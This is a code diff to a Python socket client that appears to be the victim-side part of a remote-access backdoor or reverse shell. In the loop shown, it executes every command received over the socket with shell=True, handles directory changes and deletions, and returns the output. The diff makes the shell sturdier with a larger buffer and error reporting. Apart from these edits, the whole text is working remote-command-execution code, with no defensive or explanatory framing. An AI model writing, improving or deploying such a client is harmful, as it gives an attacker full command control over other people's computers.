@@ -19,7 +19,7 @@ class Client(object):
 
     def receive_commands(self):
         while True:
-            data = self.sckt.recv(2048)
+            data = self.sckt.recv(4096)
             if data.decode("utf-8") == "?":
                 self.sckt.send("!")
             elif data[:2].decode("utf-8") == "cd":
@@ -32,9 +32,12 @@ class Client(object):
                 os.rmdir(data[6:].decode("utf-8"))
                 self.sckt.send(" ")
             elif len(data) > 0:
-                command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                output = str(command.stdout.read() + command.stderr.read())
-                self.sckt.send(str.encode(output) + " ")
+                try:
+                    command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = str(command.stdout.read() + command.stderr.read())
+                    self.sckt.send(str.encode(output) + " ")
+                except OSError as message:
+                    self.sckt.send(str(message) + " ")
         self.sckt.close()
 
 
